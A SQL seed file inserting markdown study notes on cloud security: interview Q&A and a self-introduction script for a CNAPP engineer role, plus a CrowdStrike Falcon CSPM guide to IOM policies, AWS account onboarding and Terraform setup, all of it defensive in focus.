Developer → Git Push → CI Pipeline → IaC Scan → Policy Gate → Deploy
                                         │
                                    ┌────┴────┐
                                    │ PASS     │ FAIL
                                    │ Deploy   │ Block + Notify
                                    └─────────┘
```

**What we scan for:**
- Hardcoded secrets in Terraform variables.
- Security groups/firewall rules with `0.0.0.0/0` ingress.
- Unencrypted storage resources.
- Overly permissive IAM policy documents.
- Missing logging/monitoring configurations.
- Non-compliant resource configurations per CIS Benchmarks.

**Policy as Code:**
I write custom Checkov/OPA policies for organization-specific requirements that go beyond CIS baselines. Example: 'All S3 buckets must have a specific tag `data-classification`.' This ensures governance alignment from day one."

---

## ❓ 13. Scenario-Based Interview Questions

### Q: "Your CNAPP shows 5,000 findings across multiple cloud accounts. How do you prioritize?"

**A:** "5,000 findings is normal for a large environment. I do NOT try to fix all 5,000. My prioritization framework:

1. **Internet-facing assets with Critical/High CVEs and active exploits:** These are tier-1 and get immediate remediation within the Critical SLA.
2. **Crown jewels exposure:** Any finding related to databases, data stores, or secrets management — regardless of severity — gets elevated attention.
3. **Attack path analysis:** Use the CNAPP's attack path feature. A Medium-severity misconfiguration that enables a path from internet → compute → IAM → data store is more dangerous than an isolated Critical finding.
4. **Compliance-mandated controls:** Anything that would cause an audit failure.
5. **Everything else:** Batched into regular sprint work.

I also segment by responsibility — route findings to the right team (DevOps for infra configs, App teams for code vulnerabilities, Platform for IAM)."

### Q: "A developer pushes back saying a security finding is a false positive. How do you handle it?"

**A:** "I take it seriously — developers often have context that the scanner doesn't.

1. **Verify the finding technically:** Is the flagged library actually used at runtime? Is the flagged config compensated by another control?
2. **If it's a genuine false positive:** Suppress it in the scanning tool with a documented exception. Provide the developer with feedback and potentially tune the scanner to avoid this class of FP.
3. **If it's NOT a false positive:** Show the developer the impact — ideally through an attack-path visualization or a proof-of-concept exploitation. Help them understand the 'why.'
4. **If it's valid but low-risk:** Propose a risk-acceptance route with the security risk manager's sign-off and a review date.

The goal is to be a trusted advisor, not a blocker."

### Q: "You receive a critical alert from Orca at 2 AM — a production EC2 instance has a Critical RCE vulnerability and is publicly exposed. What do you do?"

**A:**
1. **Confirm the finding:** Is the instance truly internet-facing (check SG, NACL, public IP)? Is the vulnerable service actually running (check port/process)?
2. **Immediate containment:** If confirmed, restrict the Security Group to allow only known IPs. If a patch is available, coordinate an emergency patch. If not, consider taking the service offline or adding a WAF rule.
3. **Check for compromise:** Review CloudTrail, VPC Flow Logs, and the CNAPP for any indicators of exploitation — anomalous outbound connections, new IAM credentials, cryptomining processes.
4. **Notify stakeholders:** Alert the SOC, the asset owner, and the on-call incident manager.
5. **Document everything:** Time of detection, actions taken, people involved, and outcome."

---

## 🗣️ 14. Behavioral & Soft-Skills Questions

### Q: "Tell me about a time you improved a cloud security process."

**A:** "In a previous role, our vulnerability SLA compliance was around 60% because teams received generic vulnerability reports and didn't know how to prioritize. I revamped the process:
- Built custom CNAPP dashboards per team, showing only their assets' findings ranked by exploitability and exposure.
- Automated Jira ticket creation from CNAPP with step-by-step remediation.
- Established weekly 'security syncs' with top offending teams.
- Result: SLA compliance improved from 60% to 92% in 3 months."

### Q: "Describe a time-sensitive escalation you handled."

**A:** "During the Log4Shell disclosure, I was called into a war room at midnight. Within 2 hours, I had used our CNAPP to identify all 47 instances running affected Log4j versions across 3 cloud accounts. I prioritized the 12 internet-facing production instances, coordinated with DevOps to deploy patches on those within 6 hours, and deployed WAF rules as an interim control for the remaining instances. I provided hourly updates to leadership with a clear dashboard showing remediation progress."

### Q: "How do you handle a situation where a risk is accepted but you disagree?"

**A:** "I document my technical risk assessment clearly — the potential impact, likelihood, and recommended mitigations. I present it to the risk owner and the CISO with data, not opinions. If the decision is to accept the risk, I ensure it's formally documented with:
- The risk owner's name and sign-off.
- A review date (typically 90 days).
- Compensating controls (if any).
- A clear statement of what could happen if the risk materializes.

Ultimately, it's a business decision, and my job is to ensure the decision-makers have complete and accurate information."

---

## 📅 15. 30-60-90 Day Plan for EY

### Q: "What's your plan for your first 90 days?"

**A:**

**Days 1–30 (Learn & Assess):**
- Understand EY's cloud footprint across AWS, Azure, and GCP.
- Get access to the CNAPP console (Orca or equivalent) and audit current configurations, suppressed findings, and policy coverage.
- Meet with key stakeholders — SOC, CTI, Cloud Engineering, Compliance, App Owners.
- Review existing remediation SLAs, compliance reports, and incident response playbooks.
- Identify the top 10 recurring findings and understand why they persist.

**Days 31–60 (Optimize & Integrate):**
- Tune CNAPP policies to reduce false positives and improve signal-to-noise ratio.
- Establish or refine integrations with SIEM (Splunk/Sentinel) and ticketing (Jira/ServiceNow).
- Implement automated remediation workflows for low-complexity, high-frequency findings (e.g., auto-block public S3, auto-enforce encryption).
- Build risk-ranked dashboards for leadership and team-specific views for app owners.
- Review and improve remediation SLAs based on the EY context.

**Days 61–90 (Automate & Scale):**
- Implement IaC scanning in CI/CD pipelines to shift security left.
- Develop custom CNAPP policies for EY-specific compliance requirements.
- Build automated compliance reporting for NIST/ISO 27001/CIS.
- Establish a regular cadence of security reviews, threat model sessions, and vulnerability trending reports.
- Document all processes and create runbooks for the team.
- Present a 'State of Cloud Security' report to leadership with metrics, trends, and a roadmap.

---

## 📌 Quick-Reference Cheat Sheet

| Topic | Key Points to Remember |
|---|---|
| **CNAPP** | Orca/Wiz/Prisma. Unifies CSPM + CWPP + CIEM + IaC scanning. Agentless = fast coverage. |
| **CSPM** | CIS Benchmarks, continuous monitoring, risk-ranked findings, preventive guardrails (SCPs, Azure Policies). |
| **Vuln Mgmt** | Discover → Assess → Prioritize → Remediate → Verify → Report. Risk-based, not CVSS-only. |
| **IAM** | Least privilege, MFA, CIEM, credential rotation, anomaly detection. |
| **Zero-Day** | CNAPP query → blast radius → WAF/virtual patching → patch → verify → lessons learned. |
| **SIEM** | CNAPP → SIEM (Splunk/Sentinel) → SOAR → Ticketing. Correlation rules for unified detection. |
| **Compliance** | NIST CSF, NIST 800-53, ISO 27001, CIS. Continuous assessment, mapped controls, audit evidence. |
| **Automation** | Python/Bash/PowerShell. Auto-remediate, auto-ticket, auto-report. Lambda/Azure Functions for serverless automation. |
| **IaC** | Checkov, tfsec, KICS. Scan in CI/CD. Policy-as-code. Fail builds on Critical findings. |
| **Communication** | Business impact first, actionable remediation, risk-ranked per team, security office hours. |

---

> 💡 **Tip:** For the EY interview, emphasize your experience with **CNAPP tools**, **multi-cloud environments**, **stakeholder collaboration**, and **automation**. EY values consultants who can communicate risk clearly and drive remediation at scale.$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$EY_CNAPP_Self_Intro$VELSEC$, $VELSEC$Ey Cnapp Self Intro$VELSEC$, $VELSEC$Security Engineer$VELSEC$, ARRAY['Cloud_Security']::TEXT[], $VELSEC$# 🎤 Self-Introduction: Cloud Security / CNAPP Engineer

**Name:** Gopi Krishna [Last Name]
**Target Role:** Application / Cloud Security Engineer (EY India)

---

## 1️⃣ THE QUICK HOOK (Elevator Pitch - 45 seconds)

> "Hi, I’m Gopi Krishna, a Cloud Security Engineer specializing in multi-cloud posture management and runtime protection across AWS, Azure, and GCP. In my current capacity, I leverage leading CNAPP platforms like CrowdStrike Falcon, Wiz, and Prisma to secure complex containerized environments, specifically Kubernetes and EKS. 
> 
> My core focus is bridging the gap between simply deploying security tools and actually driving measurable security outcomes. I handle the end-to-end lifecycle—from shift-left CI/CD integration and CSPM baseline enforcement, to runtime CWPP threat detection and incident response. 
> 
> What I bring to the table is a heavily automated, process-driven approach: I don't just triage alerts; I build the SLA frameworks, develop the Python automation playbooks, and tune the detection engines to ensure our engineering teams get high-fidelity signals and our infrastructure remains continuously compliant with frameworks like CIS and NIST."

---

## 2️⃣ WHAT I DO (Day-to-Day Activities - 1.5 minutes)

> "On a day-to-day basis, my activities are split between active threat monitoring, posture management, and stakeholder collaboration:

**Morning: Triage & Threat Investigation**
- I start by reviewing the CNAPP dashboard for new Critical or High indicators of attack (IOAs) and indicators of misconfiguration (IOMs).
- I use a strict decision framework to differentiate True Positives from False Positives—analyzing container process trees, network flows, and correlating CSPM findings with CIEM anomalies to catch multi-signal attack paths.
- For true threats, I initiate containment—such as isolating a compromised pod, revoking active STS sessions, or blocking public bucket access.

**Mid-Day: Remediation & Automation**
- I manage the vulnerability lifecycle. I don't just look at CVSS scores; I prioritize based on exploitability, internet exposure, and whether sensitive data is at risk.
- I route validated findings to engineering teams with specific remediation steps and strict SLAs (for example, 4 hours for a Critical public-facing CVE).
- I also write and maintain Python/Boto3 automation scripts to auto-remediate common issues, like closing 0.0.0.0/0 security groups or enforcing IAM key rotation.

**Afternoon: Posture, Tuning & Shift-Left**
- I continuously assess our compliance posture against CIS benchmarks and NIST 800-53.
- I tune our detection platforms. If a rule has a True Positive rate under 50%, I scope it down, refine the logic, or implement tightly controlled, documented suppressions to eliminate alert fatigue.
- I collaborate with DevOps to implement build-breaking policies—ensuring IaC and container images are scanned in the pipeline, backing that up with Kubernetes Admission Controllers (KAC) to prevent non-compliant deployments."

---

## 3️⃣ WHAT I CAN HANDLE (Capabilities & Scope - 1 minute)

> "In terms of scope and technical depth, I can handle:

1. **Complex Incident Response:** I can drive a container breach from identification to eradication. Whether it’s a container escape via `nsenter`, a compromised `kubeconfig`, or an IAM privilege escalation, I know how to contain the blast radius, preserve forensic evidence, and recover the environment securely.
2. **Zero-Day Emergencies:** When a critical zero-day drops, I can run an immediate blast radius assessment across all cloud accounts, pull affected asset lists, and deploy compensating controls like WAF rules or KAC blocks within hours while patching is underway.
3. **Multi-Cloud Governance:** I understand the native security controls of AWS, Azure, and GCP. I can map unified CNAPP policies down to AWS SCPs, Azure Management Groups, or GCP Organization Policies to enforce immutable guardrails.
4. **Kubernetes Workload Security:** I am deeply familiar with Pod Security Standards (PSS), configuring least-privilege RBAC, and utilizing eBPF-based sensors to monitor runtime behavior without disrupting production traffic."

---

## 4️⃣ WHAT I DELIVER (Outcomes & Value - 45 seconds)

> "Ultimately, what I deliver to the organization is continuous, provable security:

- **Actionable Alerts (>80% TP Rate):** By aggressively tuning rules and treating alert fatigue as a process failure, I deliver high-fidelity signals so engineers aren't chasing ghosts.
- **Enforced SLAs & Reduced MTTR:** I deliver a structured remediation framework. By integrating CNAPP directly with ticketing systems (like Jira/ServiceNow) and making risk visible, I significantly reduce the Mean Time to Remediate (MTTR) for critical vulnerabilities.
- **Continuous Audit Readiness:** I map every technical control and CSPM finding to compliance frameworks like CIS and NIST. This means we aren't scrambling before an audit; we can produce real-time compliance reports and evidence at any moment.
- **Secure DevOps Pipelines:** I deliver a frictionless 'shift-left' environment where security is a seamless gate in the CI/CD pipeline, catching secrets, malware, and misconfigurations before they ever reach production."

---

## 💡 Quick Tips for Delivery:
- **Pacing:** Don't rush. Pause between "What I do" and "What I can handle."
- **Adaptability:** If the interviewer specifically asks about a tool (like CrowdStrike or Wiz), explicitly name-drop it during the relevant section.
- **Confidence:** When you say "What I deliver," speak definitively. You are guaranteeing business value—lower risk, faster response, and compliance.$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$Falcon_CSPM_IOM_Terraform_Guide$VELSEC$, $VELSEC$Falcon Cspm Iom Terraform Guide$VELSEC$, $VELSEC$Security Engineer$VELSEC$, ARRAY['Cloud_Security']::TEXT[], $VELSEC$# 🛡️ CrowdStrike Falcon CSPM — IOMs, AWS Onboarding, Terraform Drift Remediation & Interview Guide

> **Purpose:** Complete learning guide for writing IOM policies/rules in CrowdStrike Falcon,
> onboarding AWS accounts, remediating misconfigurations/drift via Terraform, and
> acing interview questions on these topics.
> **Last Updated:** April 2026

---

# TABLE OF CONTENTS

| # | Section | Description |
|---|---------|-------------|
| 1 | [Writing IOM Policies & Rules](#part-1-writing-iom-policies--rules-in-crowdstrike-falcon) | How to create, customize, and manage IOM rules |
| 2 | [Onboarding AWS Accounts](#part-2-onboarding-aws-accounts-to-falcon-cspm) | Step-by-step AWS account registration |
| 3 | [Terraform Drift Remediation](#part-3-remediating-misconfigurations--drifts-with-terraform) | Detecting and fixing drift via IaC |
| 4 | [5 Terraform Container Security IOMs](#part-4-5-terraform-based-iom-rules-for-container-security) | Ready-to-use Terraform IOM rules |
| 5 | [Interview Q&A](#part-5-interview-questions--answers) | 25+ interview questions with expert answers |

---

# PART 1: WRITING IOM POLICIES & RULES IN CROWDSTRIKE FALCON

---

## 1.1 Understanding IOMs vs IOAs

```
┌──────────────────────────────────────────────────────────────────┐
│            CrowdStrike Detection Types — Side by Side            │
├──────────────────────────────┬───────────────────────────────────┤
│   IOM (Indicator of         │   IOA (Indicator of               │
│   Misconfiguration)         │   Attack)                         │
├──────────────────────────────┼───────────────────────────────────┤
│ WHAT:  Static config check   │ WHAT:  Behavioral runtime rule    │
│ WHEN:  During scan/assessment│ WHEN:  Real-time during execution │
│ WHERE: Cloud API / IaC       │ WHERE: Running workload/container │
│ SPEED: Point-in-time         │ SPEED: Continuous / live          │
│ EXAMPLE:                     │ EXAMPLE:                          │
│  S3 bucket is public         │  Container spawns reverse shell   │
│  SG allows 0.0.0.0/0:22     │  New binary runs (drift)          │
│  EKS cluster not encrypted   │  Crypto mining process detected   │
│  Pod runs as root            │  Container escape via nsenter     │
├──────────────────────────────┼───────────────────────────────────┤
│ ACTION: Alert + Jira ticket  │ ACTION: Alert + PREVENT (kill)    │
│ FIX: Change config / IaC     │ FIX: Kill process + investigate   │
└──────────────────────────────┴───────────────────────────────────┘
```

## 1.2 IOM Policy Architecture in Falcon

```
FALCON CLOUD SECURITY → CONFIGURATION ASSESSMENT → POLICIES
│
├── POLICY GROUP (e.g., "AWS Production Security Standards")
│   ├── RULE 1: S3 bucket must not be publicly accessible
│   │   ├── Severity: CRITICAL
│   │   ├── Cloud Provider: AWS
│   │   ├── Service: S3
│   │   ├── Check Logic: BucketPublicAccess != "enabled"
│   │   ├── Compliance: CIS AWS 2.1.5, PCI DSS 1.3.4
│   │   └── Action: ALERT
│   │
│   ├── RULE 2: Security Group must not allow 0.0.0.0/0 to port 22
│   │   ├── Severity: CRITICAL
│   │   ├── Cloud Provider: AWS
│   │   ├── Service: EC2 (Security Group)
│   │   ├── Check Logic: IngressRule.cidr == "0.0.0.0/0" AND port == 22
│   │   ├── Compliance: CIS AWS 5.2.1
│   │   └── Action: ALERT
│   │
│   └── RULE N: [Additional rules...]
│
├── POLICY GROUP (e.g., "Kubernetes Container Standards")
│   ├── RULE 1: Containers must not run as privileged
│   ├── RULE 2: Containers must not run as root
│   └── RULE N: [Additional rules...]
│
└── POLICY GROUP (e.g., "Compliance — CIS Benchmarks")
    ├── CIS AWS Foundations 3.0
    ├── CIS EKS Benchmark 1.4
    └── CIS Docker Benchmark 1.6
```

## 1.3 Step-by-Step: Creating IOM Policies in Falcon Console

### Method 1: Customize Built-In Policies (Recommended Start)

```
STEP 1: NAVIGATE TO POLICIES
├── Falcon Console → Cloud Security → Configuration Assessment
├── Click "Policies" tab
└── You'll see built-in policy groups organized by:
    ├── Cloud Provider (AWS / Azure / GCP)
    ├── Service (IAM, S3, EC2, EKS, RDS, etc.)
    └── Compliance Framework (CIS, NIST, PCI, SOC2)

STEP 2: SELECT A POLICY GROUP
├── Example: Select "AWS > S3 > Security Best Practices"
├── You'll see individual rules within this group
└── Each rule shows:
    ├── Rule Name
    ├── Description
    ├── Default Severity (Informational / Low / Medium / High / Critical)
    ├── Compliance Mappings
    └── Current State (Enabled / Disabled)

STEP 3: CUSTOMIZE SEVERITY
├── Click on a rule (e.g., "S3 Bucket Has Public Access")
├── Change severity from HIGH to CRITICAL (for financial org compliance)
├── Add custom compliance mapping (e.g., map to SOX requirement)
├── Justification: "Financial data in S3 — public access = regulatory violation"
└── Save

STEP 4: ENABLE/DISABLE RULES PER YOUR ENVIRONMENT
├── Disable rules that don't apply:
│   ├── "GCP Dataflow not using CMEK" → Not applicable (we don't use GCP)
│   └── "Azure NSG allows SSH from any" → Not applicable (AWS only)
├── Enable rules that were off by default:
│   └── "EKS cluster endpoint is publicly accessible" → Enable + set CRITICAL
└── Document every disable with justification in a config spreadsheet

STEP 5: ASSIGN TO ACCOUNTS/REGIONS
├── Assign policy group to specific AWS accounts:
│   ├── "Production Accounts" → All rules enforced
│   ├── "Dev/Test Accounts" → Relaxed severity (Critical → High)
│   └── "Sandbox Accounts" → Alert only, no escalation
└── Save and activate
```

### Method 2: Clone and Modify Existing Policies

```
STEP 1: FIND A SIMILAR BUILT-IN POLICY
├── Example: You want a custom rule for "EBS volumes must use CMK, not default aws/ebs"
├── Built-in rule exists: "EBS volume is unencrypted" (checks encryption on/off)
└── But you need MORE specific: must use Customer-Managed Key (CMK)

STEP 2: CLONE THE POLICY
├── Click the existing rule → "Clone"
├── New rule created: "EBS Volume Must Use Customer-Managed Key (Custom)"
├── Modify the check logic:
│   ├── Original: Encrypted = true
│   └── Custom:   Encrypted = true AND KmsKeyId != "alias/aws/ebs"
└── This checks not just that encryption is on, but that it uses YOUR key

STEP 3: SET CUSTOM METADATA
├── Name: "EBS CMK Encryption Required — Finance Standard"
├── Severity: HIGH
├── Description: "EBS volumes must be encrypted with organization CMK for key 
│   rotation control. Default aws/ebs key does not meet SOX requirements."
├── Compliance: SOX Section 302, PCI DSS 3.4
└── Tags: finance, encryption, ebs, custom

STEP 4: ENABLE AND TEST
├── Enable in "Alert Only" mode for 2 weeks
├── Review findings → How many EBS volumes use default key?
├── Work with teams to migrate to CMK
└── Graduate to standard monitoring after migration complete
```

### Method 3: Create Custom Policies from Scratch

```
STEP 1: NAVIGATE TO CUSTOM POLICIES
├── Cloud Security → Configuration Assessment → Custom Policies
└── Click "Create New Custom Policy"

STEP 2: DEFINE THE POLICY
├── Name: "Tag Compliance — Mandatory Tags Required"
├── Cloud Provider: AWS
├── Service: All Services
├── Severity: MEDIUM
├── Description: "All cloud resources must have mandatory tags: Owner, 
│   Environment, CostCenter, DataClassification"

STEP 3: DEFINE THE RULE LOGIC
├── Check: Resource must have ALL of these tags:
│   ├── "Owner" — must not be empty
│   ├── "Environment" — must be one of: production, staging, dev, sandbox
│   ├── "CostCenter" — must match pattern: CC-[0-9]{4}
│   └── "DataClassification" — must be one of: public, internal, confidential, restricted
├── Scope: All resource types in all accounts
└── Exceptions: Resources in "sandbox" accounts exempt from CostCenter tag

STEP 4: MAP TO COMPLIANCE FRAMEWORK
├── Internal Standard: "Cloud Governance Policy v2.3"
├── NIST CSF: ID.AM-2 (Software platforms and applications are inventoried)
└── CIS AWS: Custom (tag governance)

STEP 5: CONFIGURE NOTIFICATIONS
├── Critical/High IOMs → Jira ticket auto-created
├── Medium IOMs → Weekly summary email to resource owners
└── Informational → Dashboard visibility only
```

## 1.4 Severity Customization Matrix

```
┌─────────────────────────────────────────────────────────────────────────┐
│  SEVERITY OVERRIDE GUIDE — When to Change Default Severity              │
├──────────────────────────────┬─────────────┬────────────┬──────────────┤
│  Rule                        │ CrowdStrike │ Our Custom │ Why          │
│                              │ Default     │ Override   │              │
├──────────────────────────────┼─────────────┼────────────┼──────────────┤
│ S3 public access             │ HIGH        │ 🔴 CRITICAL │ PCI/GLBA     │
│ RDS publicly accessible      │ HIGH        │ 🔴 CRITICAL │ SOX/PCI      │
│ SG allows 0.0.0.0/0 SSH     │ CRITICAL    │ 🔴 CRITICAL │ CIS 5.2      │
│ Root account has access keys │ CRITICAL    │ 🔴 CRITICAL │ CIS 1.4      │
│ CloudTrail not all regions   │ MEDIUM      │ 🔴 CRITICAL │ NYDFS/SOX    │
│ IAM user without MFA         │ HIGH        │ 🔴 CRITICAL │ NYDFS mandate│
│ EBS unencrypted              │ HIGH        │ 🟠 HIGH     │ PCI Req 3    │
│ S3 without versioning        │ MEDIUM      │ 🟡 MEDIUM   │ Best practice│
│ Missing tags                 │ LOW         │ 🟡 MEDIUM   │ Governance   │
│ EKS public endpoint          │ HIGH        │ 🔴 CRITICAL │ CIS EKS      │
│ Pod running as root          │ HIGH        │ 🔴 CRITICAL │ Container sec│
│ No network policy            │ MEDIUM      │ 🟠 HIGH     │ Micro-seg    │
└──────────────────────────────┴─────────────┴────────────┴──────────────┘
```

## 1.5 IOM Policy Governance Workflow

```
NEW IOM DISCOVERED IN ENVIRONMENT
        │
        ▼
┌───────────────┐
│  TRIAGE       │ ← Security analyst reviews the finding
│  TP or FP?    │
└───────┬───────┘
        │
   ┌────┴────┐
   │         │
   ▼         ▼
TRUE POS   FALSE POS
   │         │
   │         ▼
   │    ┌──────────────┐
   │    │ Create scoped │
   │    │ exception:    │
   │    │ • Resource ARN│
   │    │ • Justification│
   │    │ • 90-day expiry│
   │    │ • Reviewer     │
   │    └──────────────┘
   │
   ▼
┌──────────────────┐
│ DETERMINE OWNER  │ ← Resource tags → team → Jira assignee
└───────┬──────────┘
        │
        ▼
┌──────────────────┐
│ CREATE TICKET    │ ← Auto via Jira/ServiceNow integration
│ • IOM details    │
│ • Resource ARN   │
│ • Fix steps      │
│ • SLA deadline   │
│ • Terraform fix  │
└───────┬──────────┘
        │
        ▼
┌──────────────────┐
│ TRACK SLA        │
│ Critical: 4h     │
│ High:     24h    │
│ Medium:   7 days │
│ Low:      30 days│
└───────┬──────────┘
        │
        ▼
┌──────────────────┐
│ VERIFY FIX       │ ← Falcon re-scans → IOM resolves automatically
│ Close ticket     │
│ Update metrics   │
└──────────────────┘
```

---

# PART 2: ONBOARDING AWS ACCOUNTS TO FALCON CSPM

---

## 2.1 Prerequisites

```
BEFORE YOU START — CHECKLIST
├── ☐ CrowdStrike Falcon subscription with Cloud Security module enabled
├── ☐ Falcon console admin access (or Cloud Security Admin role)
├── ☐ AWS account with admin/CloudFormation access
├── ☐ For AWS Organization: Management Account access
├── ☐ Decision: Individual account vs. Organization-wide onboarding
└── ☐ API Client credentials (created in Step 1 below)
```

## 2.2 Step-by-Step: AWS Account Onboarding

### Step 1: Create API Client in Falcon

```
FALCON CONSOLE → SUPPORT & RESOURCES → API CLIENTS AND KEYS

1. Click "Add New API Client"
2. Configure:
   ├── Client Name: "AWS-CSPM-Registration"
   ├── Description: "API client for CSPM AWS account registration"
   └── Scopes:
       ├── Cloud Security Registration → READ + WRITE
       ├── CSPM Registration → READ + WRITE
       └── Cloud Security Accounts → READ + WRITE

3. Click "Create"
4. ⚠️ SAVE THE CLIENT ID AND SECRET IMMEDIATELY
   ├── Client ID:     abc123def456.....
   └── Client Secret: xxxxxxxxxxxxxx (shown ONCE only)
   
5. Store securely:
   ├── AWS Secrets Manager (recommended)
   ├── HashiCorp Vault
   └── NOT in plaintext, NOT in code, NOT in Slack
```

### Step 2: Register AWS Account in Falcon Console

```
METHOD A: CONSOLE-GUIDED (RECOMMENDED FOR FIRST-TIME)
═══════════════════════════════════════════════════════

1. NAVIGATE:
   Falcon Console → Cloud Security → Cloud Account Registration
   
2. CLICK: "Register Cloud Account" → Select "AWS"

3. CHOOSE REGISTRATION TYPE:
   ├── Option A: "Single Account" — Register one AWS account
   └── Option B: "AWS Organization" — Register all accounts at once
       (Recommended for enterprise — uses AWS StackSets)

4. SELECT FEATURES TO ENABLE:
   ┌─────────────────────────────────┬──────────────────────────────┐
   │ Feature                         │ Description                  │
   ├─────────────────────────────────┼──────────────────────────────┤
   │ ☑ CSPM (Posture Management)     │ Configuration assessment     │
   │ ☑ IOM Detection                 │ Misconfiguration detection   │
   │ ☑ Behavioral Assessment (IOA)   │ Runtime threat detection     │
   │ ☑ Identity Protection           │ IAM/Identity risk analysis   │
   │ ☐ Sensor Management             │ Agent-based protection       │
   │ ☐ Data Security Posture (DSPM)  │ Sensitive data discovery     │
   └─────────────────────────────────┴──────────────────────────────┘
   
5. PROVIDE AWS DETAILS:
   ├── AWS Account ID: 123456789012
   ├── AWS Account Name: "Production-Main" (for your reference)
   └── For Organization: AWS Organization ID (ou-xxxx-xxxxxxxx)

6. FALCON GENERATES A CLOUDFORMATION TEMPLATE
   ├── Template contains:
   │   ├── IAM Role: "CrowdStrikeCSPMRole" (cross-account)
   │   ├── IAM Policy: Read-only permissions for scanning
   │   ├── Trust Relationship: CrowdStrike's AWS account
   │   └── External ID: Unique per registration (anti-confused deputy)
   │
   └── Click: "Open in AWS CloudFormation" (opens new tab)
```

### Step 3: Deploy CloudFormation Stack in AWS

```
AWS CONSOLE → CLOUDFORMATION → CREATE STACK
═══════════════════════════════════════════

1. The CloudFormation URL from Falcon auto-fills the template

2. REVIEW PARAMETERS:
   ├── CrowdStrike Falcon Client ID: (auto-populated)
   ├── CrowdStrike Falcon Client Secret: (enter from Step 1)
   ├── External ID: (auto-populated — unique per registration)
   ├── Enable IOA: true
   ├── Enable IOM: true
   └── Log Archive Region: us-east-1 (or your region)

3. ACKNOWLEDGE IAM CAPABILITIES:
   ├── ☑ "I acknowledge that AWS CloudFormation might create IAM resources"
   └── ☑ "I acknowledge that AWS CloudFormation might create IAM resources
        with custom names"

4. CLICK "CREATE STACK"

5. WAIT FOR STATUS: CREATE_COMPLETE (usually 3-5 minutes)
   ├── Outputs tab will show:
   │   ├── RoleARN: arn:aws:iam::123456789012:role/CrowdStrikeCSPMRole
   │   ├── ExternalID: cs-xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
   │   └── EventBridge Rule ARN (for IOA behavioral scanning)
   └── If FAILED: Check Events tab for the specific error
        (usually IAM permission issue or duplicate role name)

FOR AWS ORGANIZATION (ALL ACCOUNTS):
├── The template uses AWS StackSets to deploy to all member accounts
├── StackSet deployment status visible in CloudFormation → StackSets
├── New accounts added later → auto-enrolled via StackSet
└── Delegated admin account can manage without management account
```

### Step 4: Verify Registration in Falcon

```
BACK IN FALCON CONSOLE:
═══════════════════════

1. VERIFY ACCOUNT APPEARS:
   Cloud Security → Cloud Account Registration
   ├── Account ID: 123456789012
   ├── Status: ✅ Connected
   ├── Features: CSPM ✅, IOA ✅, Identity ✅
   └── Last Scan: Just now / In progress

2. WAIT FOR FIRST SCAN (15-30 minutes):
   ├── Cloud Security → Configuration Assessment → Dashboard
   ├── You'll see initial findings populate
   └── Baseline metrics established

3. VERIFY PERMISSIONS:
   ├── Cloud Security → Health & Diagnostics
   │   ├── All checks green = good
   │   ├── Yellow/Red = missing permissions → review IAM policy
   │   └── Common issue: missing s3:GetBucketPolicy / ec2:DescribeSecurityGroups

4. INITIAL BASELINE:
   ├── First scan will likely show hundreds of IOMs
   ├── Don't panic — this is your starting point
   ├── Focus on: Critical + Internet-facing first
   └── Create a remediation plan (see Part 3)
```

### Alternative: Terraform-Based Onboarding

```hcl
# ==================================================================
# METHOD B: TERRAFORM ONBOARDING (RECOMMENDED FOR IaC-FIRST ORGS)
# ==================================================================

# 1. Configure the CrowdStrike Provider
terraform {
  required_providers {
    crowdstrike = {
      source  = "crowdstrike/crowdstrike"
      version = "~> 1.0"
    }
  }
}

provider "crowdstrike" {
  client_id     = var.falcon_client_id      # From API Client creation
  client_secret = var.falcon_client_secret   # From API Client creation
  cloud         = "us-1"                     # us-1, us-2, eu-1, etc.
}

# 2. Register the AWS Account
resource "crowdstrike_cloud_aws_account" "production" {
  account_id        = "123456789012"
  organization_id   = "o-xxxxxxxxxx"         # Optional: for org-wide
  
  # Features to enable
  cspm_enabled      = true
  behavior_assessment_enabled = true
  sensor_management_enabled   = false
  
  # Account metadata
  account_type      = "commercial"           # commercial or gov-cloud
}

# 3. Create the IAM Role in AWS (using AWS provider)
provider "aws" {
  region = "us-east-1"
}

module "crowdstrike_cspm" {
  source  = "crowdstrike/cloud-registration/aws"
  version = "~> 1.0"

  falcon_client_id  = var.falcon_client_id
  external_id       = crowdstrike_cloud_aws_account.production.external_id
  
  enable_iom        = true
  enable_ioa        = true
  enable_idp        = true
  
  # Optional: Limit scanning to specific regions
  # target_regions  = ["us-east-1", "us-west-2", "eu-west-1"]
}

# 4. Variables
variable "falcon_client_id" {
  type        = string
  description = "CrowdStrike Falcon API Client ID"
  sensitive   = true
}

variable "falcon_client_secret" {
  type        = string
  description = "CrowdStrike Falcon API Client Secret"
  sensitive   = true
}

# 5. Outputs
output "cspm_role_arn" {
  value = module.crowdstrike_cspm.iam_role_arn
}

output "registration_status" {
  value = crowdstrike_cloud_aws_account.production.status
}
```

## 2.3 Post-Onboarding Checklist

```
AFTER SUCCESSFUL ONBOARDING — OPERATIONAL SETUP
════════════════════════════════════════════════

☐ SCAN RESULTS REVIEW (Day 1)
   ├── Review initial IOM count by severity
   ├── Identify false positives from environment-specific configs
   ├── Create exceptions for known acceptable risks (with documentation)
   └── Set baseline metrics for tracking improvement

☐ NOTIFICATION SETUP (Day 1-2)
   ├── Critical IOMs → PagerDuty/OpsGenie → SOC on-call
   ├── High IOMs → Slack #cloud-security channel
   ├── Medium/Low IOMs → Weekly digest email to team leads
   └── New account registration alerts → Security team

☐ INTEGRATION SETUP (Week 1)
   ├── Jira integration → Auto-create tickets for Critical/High
   ├── SIEM integration → Forward IOMs to Splunk/Sentinel
   ├── Slack integration → Real-time notifications
   └── ServiceNow → CMDB mapping for asset ownership

☐ POLICY TUNING (Week 1-2)
   ├── Customize severity for your compliance requirements
   ├── Disable irrelevant rules (services not in use)
   ├── Enable additional rules missed by defaults
   └── Map policies to your compliance frameworks

☐ TEAM ONBOARDING (Week 2)
   ├── Create read-only roles for DevOps teams
   ├── Train teams on interpreting IOMs
   ├── Share remediation runbooks
   └── Establish SLA expectations

